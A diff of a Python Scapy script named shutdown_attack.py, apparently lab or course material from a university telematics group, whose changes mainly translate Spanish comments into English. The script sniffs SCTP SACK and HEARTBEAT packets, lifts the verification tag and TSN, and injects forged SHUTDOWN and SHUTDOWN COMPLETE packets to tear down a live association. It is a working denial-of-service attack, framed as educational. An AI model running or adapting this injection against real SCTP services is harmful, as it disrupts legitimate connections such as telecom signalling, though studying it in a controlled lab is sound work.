@@ -1,16 +1,25 @@
-# This script captures an SCTP HEARTBEAT packet and sends a SHUTDOWN packet to simulate a shutdown attack.
-# It uses Scapy to sniff packets, extract relevant details, crafting a SHUTDOWN packet, and send it.
-# The script is designed to run in a controlled environment where SCTP traffic is present.
-# Ensure you have Scapy installed and run this script with appropriate permissions.
-# Note: This script is for educational purposes only. Use responsibly and ethically.
+"""
+===============================================================================
+Script Name: shutdown_attack.py
+Description : This script captures a HEARTBEAT SCTP packet to extract relevant information
+              and sends an SHUTDOWN SCTP packet to execute an SCTP attack.
+Author      : Grupo de Ingeniería Telemática. Universidad de Cantabria
+===============================================================================
+
+Notes:
+- It uses Scapy library to sniff packets, extract relevant details, crafting a new packet, and send it.
+- The script is designed to run in a controlled environment where SCTP traffic is present.
+- Ensure you have Scapy installed and run this script with appropriate permissions.
+- This script is for educational purposes only. Use responsibly and ethically.
+===============================================================================
+"""
 
 from scapy.all import *
 
-# Constantes para las direcciones IP
-IP_CLIENT = "10.10.10.7"  # Node C
-IP_SERVER = "10.10.10.155"  # Node S
+IP_CLIENT = "10.10.10.7" # Replace with the actual SCTP client IP
+IP_SERVER = "10.10.10.155" # Replace with the actual SCTP server IP
 
-# Función para verificar HEARTBEAT
+# Function to check HEARTBEAT
 def is_heartbeat_packet(pkt):
     if SCTP not in pkt:
         print("No SCTP layer")
@@ -31,7 +40,7 @@ def is_heartbeat_packet(pkt):
     return False
 
 """
-Captura un paquete SCTP HEARTBEAT y devuelve el primer paquete capturado.
+Captures a HEARTBEAT SCTP packet and returns the first packet captured.
 """
 def capture_heartbeat_packet():
     print(f"\n[*] Monitoring network for SCTP HEARTBEAT packet from {IP_CLIENT} to {IP_SERVER}...")
@@ -48,7 +57,7 @@ def capture_heartbeat_packet():
     return packets[0]
 
 """
-Extrae detalles relevantes de un paquete SCTP HEARTBEAT.
+Extracts relevant details from a HEARTBEAT SCTP packet.
 """
 def extract_heartbeat_details(pkt):
     src_ip = pkt[IP].src
@@ -66,7 +75,7 @@ def extract_heartbeat_details(pkt):
     }
 
 """
-Imprime los detalles del paquete SCTP HEARTBEAT.
+Prints the details of a HEARTBEAT SCTP packet.
 """
 def print_heartbeat_packet_details(details):
     print("\n[*] Captured HEARTBEAT packet details:")
@@ -77,7 +86,7 @@ def print_heartbeat_packet_details(details):
     print(f"   - Verification Tag: {details['vtag']:#010x}")
 
 """
-Construye un paquete SCTP SHUTDOWN utilizando los detalles extraídos.
+Constructs a SHUTDOWN SCTP packet using the extracted details.
 """
 def crafting_shutdown_packet(details, tsn_ack):
     return (
@@ -87,7 +96,7 @@ def crafting_shutdown_packet(details, tsn_ack):
     )
 
 """
-Imprime los detalles del paquete SCTP SHUTDOWN.
+Prints the details of a SHUTDOWN SCTP packet.
 """
 def print_shutdown_packet_details(details):
     print("\n[*] SHUTDOWN packet parameters:")
@@ -99,7 +108,7 @@ def print_shutdown_packet_details(details):
     print(f"   - Verification Tag: {details['vtag']:#010x}")
 
 """
-Envía un paquete SCTP SHUTDOWN.
+Sends a SHUTDOWN SCTP packet.
 """
 def send_shutdown_packet(pkt):
     print(f"\n[*] Sending SHUTDOWN packet to Node Server ({IP_SERVER})...")
@@ -120,7 +129,7 @@ def is_sack_packet(pkt):
     return False
 
 """
-Extrae el valor del campo 'cumul_tsn_ack' del chunk SACK.
+Extracts the value of the 'cumul_tsn_ack' field from the SACK chunk.
 """
 def extract_cumulative_tsn_ack(pkt):
     sctp = pkt[SCTP]
@@ -139,7 +148,7 @@ def extract_cumulative_tsn_ack(pkt):
     return sack_chunk.cumul_tsn_ack
 
 """
-Captura un paquete SCTP SACK y devuelve el primer paquete capturado.
+Captures a SACK SCTP packet and returns the first packet captured.
 """
 def capture_sack_packet():
     print(f"[*] Monitoring network for SCTP SACK packet from {IP_CLIENT} to {IP_SERVER}...")
@@ -156,7 +165,7 @@ def capture_sack_packet():
     return packets[0]
 
 """
-Verifica si el paquete es un SCTP SHUTDOWN ACK.
+Verify if the packet is a SCTP SHUTDOWN ACK.
 """
 def is_shutdown_ack_packet(pkt):
     if SCTP in pkt and isinstance(pkt[SCTP].payload, SCTPChunkShutdownAck):
@@ -165,7 +174,7 @@ def is_shutdown_ack_packet(pkt):
     return False
 
 """
-Captura un paquete SCTP SHUTDOWN ACK y devuelve el primer paquete capturado.
+Captures a SHUTDOWN ACK SCTP packet and returns the first packet captured.
 """
 def capture_shutdown_ack_packet():
     print(f"\n[*] Monitoring network for SCTP SHUTDOWN ACK packet from {IP_SERVER} to {IP_CLIENT}...")
@@ -182,7 +191,7 @@ def capture_shutdown_ack_packet():
     return packets[0]
 
 """
-Envía un paquete SCTP SHUTDOWN COMPLETE.
+Sends a SHUTDOWN COMPLETE SCTP packet.
 """
 def send_shutdown_complete_packet(details):
     print(f"\n[*] Sending SHUTDOWN COMPLETE packet to Node Server ({IP_SERVER})...")
@@ -195,27 +204,27 @@ def send_shutdown_complete_packet(details):
     print("   - SHUTDOWN COMPLETE packet sent.")
 
 def main():
-    # Capturar un paquete SACK
+    # Captures a SACK SCTP packet
     sack_pkt = capture_sack_packet()
 
     tsn_ack = extract_cumulative_tsn_ack(sack_pkt)
 
-    # Capturar un paquete HEARTBEAT
+    # Captures a HEARTBEAT SCTP packet
     heartbeat_pkt = capture_heartbeat_packet()
 
-    # Extraer detalles del paquete HEARTBEAT
+    # Extracts details from the HEARTBEAT packet
     heartbeat_details = extract_heartbeat_details(heartbeat_pkt)
 
-    # Imprimir detalles del paquete HEARTBEAT
+    # Prints the details of the HEARTBEAT packet
     print_heartbeat_packet_details(heartbeat_details)
 
-    # Construir el paquete SHUTDOWN
+    # Constructs the SHUTDOWN packet
     shutdown_pkt = crafting_shutdown_packet(heartbeat_details, tsn_ack)
 
-    # Imprimir detalles del paquete SHUTDOWN
+    # Prints the details of the SHUTDOWN packet
     print_shutdown_packet_details(heartbeat_details)
 
-    # Enviar el paquete SHUTDOWN
+    # Sends the SHUTDOWN packet
     send_shutdown_packet(shutdown_pkt)
 
     shutdown_ack_pkt = capture_shutdown_ack_packet()
